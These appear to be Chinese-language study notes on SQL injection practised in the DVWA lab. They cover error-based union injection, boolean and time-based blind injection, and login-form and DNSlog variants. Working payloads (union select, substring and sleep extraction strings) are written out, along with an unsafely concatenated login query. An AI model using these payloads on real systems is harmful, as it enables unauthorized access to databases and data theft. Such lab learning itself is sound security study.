SQL注入

攻击者传入恶意的sql语句，从而产生歧义

用dvwa做简单实验环境

注意事项 1> sql注入时的注释符#在URL中会被重新编码，所以在URL中注释时使用–+

显注(问什么答什么)

形成原因，未对用户的输入进行过滤

Eg:

SELECT first_name, last_name FROM users WHERE user_id = '$id';

用户输入的会当成 ‘$id’ 传入数据库查询

SELECT first_name, last_name FROM users WHERE user_id = '1';				#正常用户输入
SELECT first_name, last_name FROM users WHERE user_id = '1' and 1=1 #';		#恶意用户，然而依然可以查询出数据

判断：

​ 显注 1’ 返回sql报错

攻击：

​ 判断字段数量 order by 1 2 3

​ 拼写语句，查找基础信息 databases() user() …

​ 跨库： 库名 –> tables –> 列名

​ 最终目的： union查询数据，并且可以查询到web页面

拖数据

1' and 1=2 union select 1,database()#

​

盲注

盲注（布尔型）（只返回对错）：

判定：

1				#1
1' and 1=1#		#2
1' and 1=2#		#3

若#1，#2的payload返回结果一致，并且与#3的payload返回结果不一致即存在sql注入

攻击：

​ 判断字段数量 order by 1 2 3

​ 判断实际内容：长度（length）–>一个一个字母判断（substring）

​ 数据： 库名 –>tables–> 列名

盲注（时间型）（根据响应的时间）：

判断：

1' and sleep(10)#	#如果有注入则会等待10秒钟再返回数据

带入数据库的语句：

SELECT first_name, last_name FROM users WHERE user_id = '1' and sleep(10)#';

这个payload，盲注，显注都可以打

拖数据

一个一个试：

1' and substring(database(),1,1)='d' #							#布尔
1' and if(substring(database(),1,1)='d',sleep(10),1)#			#时间 猜对卡顿10s,否则直接返回

特殊：

登录框

$sql="SELECT username, password FROM users WHERE username='$uname' and password='$passwd' LIMIT 0,1";

dnslog注入

作用：把盲注变成显注，更快
